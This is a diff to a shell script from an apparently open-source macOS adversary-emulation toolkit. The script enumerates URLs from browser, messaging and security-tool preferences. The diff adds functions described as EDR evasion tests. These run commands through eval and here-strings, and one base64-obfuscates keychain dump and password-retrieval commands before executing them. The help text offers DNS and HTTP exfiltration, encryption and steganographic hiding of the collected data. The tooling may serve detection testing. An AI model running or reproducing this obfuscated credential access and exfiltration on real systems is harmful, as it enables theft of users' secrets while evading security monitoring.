@@ -3,12 +3,12 @@
 # Procedure Name: search_urls
 # Tactic: Discovery
 # Technique: T1082
-# GUID: 7b75cf3c-ed89-4b79-9ab9-e47c2210836b
+# GUID: 427311de-a065-4b2c-b190-5feb4bfdff75
 # Intent: Discover URLs and web-related configuration data using macOS defaults command to enumerate browsing history, bookmarks, and web service endpoints.
 # Author: @darmado | https://x.com/darmad0
 # created: 2025-01-27
-# Updated: 2025-05-30
-# Version: 1.0.0
+# Updated: 2025-06-03
+# Version: 1.0.2
 # License: Apache 2.0
 
 # Core function Info:
@@ -42,7 +42,7 @@ JOB_ID=""  # Will be set after core functions are defined
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
-PARENT_PROCESS="$(ps -p $PPID -o comm=)"
+PARENT_PROCESS="shell"
 
 # Core Commands
 CMD_BASE64="base64"
@@ -98,6 +98,9 @@ CMD_DEFAULTS="defaults"
 URL_DOMAINS="NSGlobalDomain com.apple.Safari com.google.Chrome org.mozilla.firefox com.microsoft.EdgeMAC com.brave.Browser com.vivaldi.Vivaldi org.chromium.Chromium com.duckduckgo.macos.browser org.torproject.torbrowser com.apple.mail com.microsoft.teams2 com.okta.mobile com.cloudflare.1dot1dot1dot1.macos com.tinyspeck.slackmacgap com.hnc.Discord net.whatsapp.WhatsApp org.whispersystems.signal-desktop com.microsoft.VSCode com.figma.Desktop com.postmanlabs.mac com.github.Electron com.electron.dockerdesktop com.spotify.client com.grammarly.ProjectLlama com.grammarly.safari.extension com.linear md.obsidian dev.warp.Warp-Stable com.googlecode.iterm2 com.apple.Messages com.apple.FaceTime com.apple.Notes com.apple.News com.apple.newscore com.apple.Music com.apple.TV com.apple.AppStore com.apple.appstored com.apple.Maps com.apple.Photos com.apple.Wallet com.google.drivefs com.microsoft.autoupdate2 com.microsoft.to-do-mac org.openvpn.client.app ch.protonvpn.mac com.apple.weather.sensitive com.apple.weatherd com.apple.stocks com.apple.reminders com.apple.iCal com.apple.iChat com.apple.iTunes com.apple.itunescloud com.apple.itunesstored com.apple.Terminal com.apple.TextEdit com.apple.Preview com.apple.QuickTimePlayerX com.apple.ScreenSharing com.apple.Console com.apple.ActivityMonitor com.apple.systempreferences burp.extensions._auth burp.extensions._bcheck burp.extensions._burp burp.extensions._change burp.extensions._csrf burp.extensions._customizer burp.extensions._error burp.extensions._freddy burp.extensions._http burp.extensions._jwt burp.extensions._replicator burp.extensions._reshaper burp.extensions._sensitive burp.extensions._software burp.pro.detached-frames com.objective-see.KnockKnock com.objective-see.Netiquette com.objective-see.oversight com.objectiveSee.BlockBlock com.malwarebytes.mbam.frontend.application com.redcanary.agent com.canva.canvaeditor com.apple.cloudd com.apple.cloudpaird com.apple.icloud.fmfd com.firebase.FIRInstallations com.google.Keystone.Agent us.zoom.xos us.zoom.ZoomClips com.obsproject.obs-studio.helper.renderer org.sparkle-project.Sparkle.Autoupdate com.segment.storage.1f1G4Yg6Ca2De9zafBSlsDQ1fH8PSwej com.google.gmp.measurement com.lemon.lvoverseas com.bytedance.CapCut com.capcut.CapCut com.streamlabs.slobs com.sophos.ipm"
 URL_PROTOCOLS="https http ftp ldap ldaps ssh sftp smb nfs file"
 
+# Project root path (set by build system)
+PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
+
 # Procedure Information (set by build system)
 PROCEDURE_NAME="search_urls"  # Set by build system from YAML procedure_name field
 
@@ -106,7 +109,7 @@ FUNCTION_LANG=""  # Ued by log_output at execution time
 
 # Logging Settings
 HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_DIR="${PROJECT_ROOT}/logs"  # Project root logs directory (PROJECT_ROOT set by build system)
 LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
 LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
 LOG_ENABLED=false
@@ -171,17 +174,8 @@ core_get_timestamp() {
 # Outputs: 8-character hexadecimal job ID
 # - None
 core_generate_job_id() {
-    # Use openssl to generate random hex string for job tracking
-    # Fallback to date-based ID if openssl not available
-    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
-        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
-            # Fallback: use timestamp and process ID
-            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-        }
-    else
-        # Fallback: use timestamp and process ID
-        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-    fi
+    # Simple random job ID - just a random identifier
+    printf "%08x" "$((RANDOM * RANDOM))"
 }
 
 # Purpose: Print debug messages to stderr when debug mode is enabled
@@ -237,12 +231,45 @@ core_log_output() {
     local skip_data="${3:-false}"
     
     if [ "$LOG_ENABLED" = true ]; then
-        # Ensure log directory exists
-            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+        # Ensure log directory exists and is writable
+        if [ ! -d "$LOG_DIR" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
             }
+        fi
+        
+        # Check if directory is writable
+        if [ ! -w "$LOG_DIR" ]; then
+            $CMD_PRINTF "Warning: Log directory not writable: %s\n" "$LOG_DIR" >&2
+            return 1
+        fi
+        
+        # Ensure LOG_FILE_NAME is set and not empty
+        if [ -z "$LOG_FILE_NAME" ]; then
+            $CMD_PRINTF "Warning: LOG_FILE_NAME is empty or not set.\n" >&2
+            return 1
+        fi
+        
+        # Check if log file exists and handle ownership/permission issues
+        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if [ ! -w "$LOG_DIR/$LOG_FILE_NAME" ]; then
+                # File exists but not writable - create new log with timestamp suffix
+                local timestamp=$(date +%Y%m%d_%H%M%S)
+                local base_name="${LOG_FILE_NAME%.*}"
+                local extension="${LOG_FILE_NAME##*.}"
+                LOG_FILE_NAME="${base_name}_${timestamp}.${extension}"
+                core_debug_print "Original log not writable, using: $LOG_FILE_NAME"
+            fi
+        fi
+        
+        # Create log file if it doesn't exist
+        if [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if ! touch "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null; then
+                $CMD_PRINTF "Error: Failed to create log file: %s\n" "$LOG_DIR/$LOG_FILE_NAME" >&2
+                return 1
+            fi
+            core_debug_print "Created new log file: $LOG_DIR/$LOG_FILE_NAME"
         fi
         
         # Check log size and rotate if needed
@@ -250,6 +277,8 @@ core_log_output() {
             $CMD_MV "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
             core_debug_print "Log file rotated due to size limit"
         fi
+        
+        core_debug_print "Writing log entry to: $LOG_DIR/$LOG_FILE_NAME"
         
         # Log detailed entry
         "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
@@ -565,6 +594,17 @@ core_parse_args() {
                     STEG_EXTRACT_FILE="./hidden_data.png"
                 fi
                 ;;
+            --steg-extract-file)
+                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
+                    STEG_EXTRACT_FILE="$2"
+                    shift
+                else
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+            --verbose)
+                DEBUG=true
+                ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
         --urls)
             URLS=true
@@ -581,7 +621,7 @@ core_parse_args() {
         shift
     done
     
-    core_debug_print "Arguments parsed: DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
+    core_debug_print "Arguments parsed: DEBUG=$DEBUG, LOG_ENABLED=$LOG_ENABLED, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
     
     # Report unknown arguments as warnings but don't exit
     if [ -n "$UNKNOWN_ARGS" ]; then
@@ -602,42 +642,49 @@ Usage: ${0##*/} [OPTIONS]
 Description: Base script for ATT&CK macOS techniques
 MITRE ATT&CK: ${TTP_ID} - ${TACTIC}
 
-Basic Options:
-  -h, --help           Display this help message
-  -d, --debug          Enable debug output (includes verbose output)
-  -a, --all            Process all available data (technique-specific)
-  --urls                    Discover URLs from all preference domains
+HELP:
+  -h, --help                    Display this help message
+  -d, --debug                   Enable debug output (includes verbose output)
+
+SCRIPT:
+  --urls                           Discover URLs from all preference domains
 
 Output Options:
-  --format TYPE        Output format: 
-                        - json: Structured JSON output
-                        - csv: Comma-separated values
-                        - raw: Default pipe-delimited text
+  --format TYPE                 
+                                - json: Structured JSON output
+                                - csv: Comma-separated values
+                                - raw: Default pipe-delimited text
 
-Encoding/Obfuscation Options:
-  --encode TYPE        Encode output using:
-                        - base64/b64: Base64 encoding using base64 command
-                        - hex/xxd: Hexadecimal encoding using xxd command
-                        - perl_b64: Perl Base64 implementation using perl
-                        - perl_utf8: Perl UTF8 encoding using perl
-  --steganography      Hide output in image file using native macOS tools
-  --steg-extract [FILE] Extract hidden data from steganography image (default: ./hidden_data.png)
+ENCODING/OBFUSCATION
+  --encode TYPE                
+                                - base64/b64: Base64 encoding using base64 command
+                                - hex/xxd: Hexadecimal encoding using xxd command
+                                - perl_b64: Perl Base64 implementation using perl
+                                - perl_utf8: Perl UTF8 encoding using perl
 
-Encryption Options:
-  --encrypt TYPE       Encrypt output using:
-                        - aes: AES-256-CBC encryption using openssl command
-                        - gpg: GPG symmetric encryption using gpg command
-                        - xor: XOR encryption with cyclic key (custom implementation)
+  --steganography              Hide output in image file using native macOS tools
+  --steg-extract [FILE]        Extract hidden data from steganography image (default: ./hidden_data.png)
 
-Exfiltration Options:
-  --exfil-dns DOMAIN   Exfiltrate data via DNS queries using dig command
-                        Data is automatically base64 encoded and chunked
-  --exfil-http URL     Exfiltrate data via HTTP POST using curl command
-                        Data is sent in the request body
-  --exfil-uri URL      Legacy parameter - Exfiltrate via HTTP GET using curl
-                        Data is automatically chunked to avoid URL length limits
-  --chunk-size SIZE    Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
-  --proxy URL          Use proxy for HTTP requests (format: protocol://host:port)
+ENCRYPTION:
+  --encrypt TYPE               
+                                - aes: AES-256-CBC encryption using openssl command
+                                - gpg: GPG symmetric encryption using gpg command
+                                - xor: XOR encryption with cyclic key (custom implementation)
+
+EXFILTRATION:
+  --exfil-dns DOMAIN            Exfiltrate data via DNS queries using dig command
+                                Data is automatically base64 encoded and chunked
+
+  --exfil-http URL              Exfiltrate data via HTTP POST using curl command
+                                Data is sent in the request body
+                                Data is automatically chunked to avoid URL length limits
+
+  --chunk-size SIZE           Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
+  --proxy URL                 Use proxy for HTTP requests (format: protocol://host:port)
+
+  LOGGING:
+
+  -l, --log                     Create a log file (creates logs in ./logs directory)
 
 Notes:
 - When using encryption with exfiltration, keys are automatically sent via DNS TXT records
@@ -1773,6 +1820,116 @@ core_check_db_lock() {
     return 0
 }
 
+# Purpose: Execute command stored in variable using direct expansion (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of dynamic command execution without eval
+core_exec_cmd() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via variable expansion: $cmd_string"
+    
+    # Method 1: Store command in variable then execute via direct expansion
+    local EXEC_CMD="$cmd_string"
+    $EXEC_CMD
+    
+    return $?
+}
+
+# Purpose: Execute command using here-string input redirection (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of here-string command execution
+core_exec_cmd_herestring() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd_herestring"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via here-string: $cmd_string"
+    
+    # Execute command using here-string (feeds command as stdin to shell)
+    sh <<< "$cmd_string"
+    
+    return $?
+}
+
+# Purpose: Execute command using dynamic string construction (EDR evasion test)
+# Inputs: Variable number of string fragments to concatenate into command
+# Outputs: Command execution result
+# - Tests EDR detection of dynamically constructed commands
+core_exec_cmd_construct() {
+    local fragments="$*"
+    local constructed_cmd=""
+    
+    if [ -z "$fragments" ]; then
+        core_debug_print "No command fragments provided to core_exec_cmd_construct"
+        return 1
+    fi
+    
+    # Concatenate all fragments into single command
+    for fragment in $fragments; do
+        constructed_cmd="${constructed_cmd}${fragment}"
+    done
+    
+    core_debug_print "Dynamically constructed command: $constructed_cmd"
+    
+    # Execute the constructed command
+    eval "$constructed_cmd"
+    
+    return $?
+}
+
+# Purpose: Execute keychain commands using base64 obfuscation (EDR evasion test)
+# Inputs: $1 - operation type (dump|find|list)
+# Outputs: Keychain command execution result  
+# - Tests EDR detection of obfuscated keychain access
+core_exec_keychain_obfuscated() {
+    local operation="$1"
+    local cmd=""
+    
+    case "$operation" in
+        "dump")
+            # Construct: security dump-keychain
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
+            cmd="$a$b$c"
+            ;;
+        "find")
+            # Construct: security find-generic-password -g
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZmluZC1nZW5lcmljLXBhc3N3b3Jk" | base64 -d)  # "find-generic-password"
+            local d=" -g"
+            cmd="$a$b$c$d"
+            ;;
+        "list")
+            # Construct: security list-keychains
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "bGlzdC1rZXljaGFpbnM=" | base64 -d)  # "list-keychains"
+            cmd="$a$b$c"
+            ;;
+        *)
+            core_debug_print "Unknown keychain operation: $operation"
+            return 1
+            ;;
+    esac
+    
+    core_debug_print "Executing obfuscated keychain command: $cmd"
+    eval "$cmd"
+    
+    return $?
+}
+
 # Main function 
 core_main() {
     local raw_output=""
@@ -1834,11 +1991,18 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
+# Helper function to execute procedure functions
+execute_function() {
+    local func_name="$1"
+    # Call the function directly - let the function handle its own permissions
+    $func_name
+}
+
 # Execute functions for --urls
 if [ "$URLS" = true ]; then
     core_debug_print "Executing functions for --urls"
-    result=$(discover_urls)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function discover_urls)
+    raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
@@ -2006,10 +2170,14 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-# Functions from YAML procedure
+
 
 # Function: discover_urls
-# Description: discover_urls - Generated from YAML
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 discover_urls() {
     core_debug_print "Discovering URLs from common preference domains"
     
@@ -2032,7 +2200,8 @@ discover_urls() {
     done
     
     return 0
-} 
+}
+
 
 
 JOB_ID=$(core_generate_job_id)
